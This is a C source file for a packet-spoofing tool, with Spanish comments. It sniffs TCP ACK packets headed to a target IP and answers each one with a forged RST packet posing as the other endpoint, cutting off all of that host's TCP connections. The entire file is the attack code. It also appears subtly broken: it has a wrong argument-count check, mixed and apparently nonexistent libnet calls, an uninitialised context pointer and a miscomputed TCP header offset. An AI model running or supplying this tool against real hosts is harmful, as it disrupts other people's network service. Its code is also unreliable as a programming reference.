#include <libnet.h>
#include <pcap.h>
#include "hacking.h"

#define LIBNET_ERR_FATAL     0x01
#define LIBNET_ERR_WARNING   0x02

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);
void libnet_error(const short , const u_char * );

struct data_pass {
    int libnet_handle;
    u_char *packet;
};

int main(int argc, char *argv[]) {
    struct pcap_pkthdr cap_header;
    const u_char *packet, *pkt_data;
    pcap_t *pcap_handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *device;
    u_long target_ip;
    int network;
    struct data_pass critical_libnet_data;

    if(argc < 1) {
        printf("Usage: %s <target IP>\n", argv[0]);
        exit(0);
    }
    target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);

    if (target_ip == -1)
        fatal("Invalid target address");

    device = pcap_lookupdev(errbuf);
    if(device == NULL)
        fatal(errbuf);

    /* 128 snap length por que solo necesito saber los datos del header para robar la sesion de TCP*/

    pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
    if(pcap_handle == NULL)
        fatal(errbuf);
    /*Para trabajar a bajo nivel con los protocolos */
    critical_libnet_data.libnet_handle = libnet_open_raw4(IPPROTO_RAW);
    if(critical_libnet_data.libnet_handle == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must runs root.\n");
    /*Creo el paquete*/
    libnet_init_packet(LIBNET_RIP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
    if (critical_libnet_data.packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

    libnet_seed_prand(LIBNET_PR8);

    set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

    /*
     * Le paso un un puntero a la direccion de memoria de mi data para que la funcion caught_packet
     * tenga acceso a todo en la estructura
     * */

    printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
    pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

    pcap_close(pcap_handle);
}

int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {
    struct bpf_program filter;
    char filter_string[100];

    sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s",
            inet_ntoa(*target_ip));

    /*
     * Solo busco los tcp-ack de un ip concreta.
     * */
    printf("DEBUG: filter string is \'%s\'\n", filter_string);
    if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
        fatal("pcap_compile failed");

    if(pcap_setfilter(pcap_hdl, &filter) == -1)
        fatal("pcap_setfilter failed");
}


void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char* packet) {
    u_char *pkt_data;
    struct libnet_ipv4_hdr *IPhdr;
    struct libnet_tcp_hdr *TCPhdr;
    struct data_pass *passed;
    int bcount;
    struct libnet_context *TCPcont;

    passed = (struct data_pass *) user_args;

    IPhdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
    TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

    printf("resetting TCP connection from %s:%d ",
           inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
    printf("<---> %s:%d\n",
           inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));
    libnet_build_rip(LIBNET_TCP_H,      // Size of the packet sans IP header
                    IPTOS_LOWDELAY,                 // IP tos
                    libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
                    0,                              // Frag stuff
                    libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
                    IPPROTO_TCP,                    // Transport protocol
                    *((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst)
                    *((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src)
                    NULL,                           // Payload (none)
                    0,                              // Payload length
                    passed->packet);                // Packet header memory

    libnet_build_tcp(htons(TCPhdr->th_dport), // Source TCP port (pretend we are dst)
                     htons(TCPhdr->th_sport),        // Destination TCP port (send back to src)
                     htonl(TCPhdr->th_ack),          // Sequence number (use previous ack)
                     libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)
                     TH_RST,                         // Control flags (RST flag set only)
                     libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
                     TCPhdr->th_sum,
                     0,                                   // Urgent pointer
                     LIBNET_TCP_H,
                     NULL,                           // Payload (none)
                     0,                              // Payload length
                     TCPcont,
                     (passed->packet) + LIBNET_RIP_H);// Packet header memory

    if (libnet_do_checksum(passed->packet, IPhdr->ip_hl ,IPPROTO_TCP, LIBNET_TCP_H) == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

    bcount = libnet_write_ip(passed->libnet_handle, passed->packet,
                             LIBNET_RIP_H+LIBNET_TCP_H);
    if (bcount < LIBNET_RIP_H + LIBNET_TCP_H)
        libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");

    usleep(5000); // pause slightly
}

void libnet_error(const short ERROR, u_char const * msg){
    printf("%s", msg);
    exit(ERROR);
}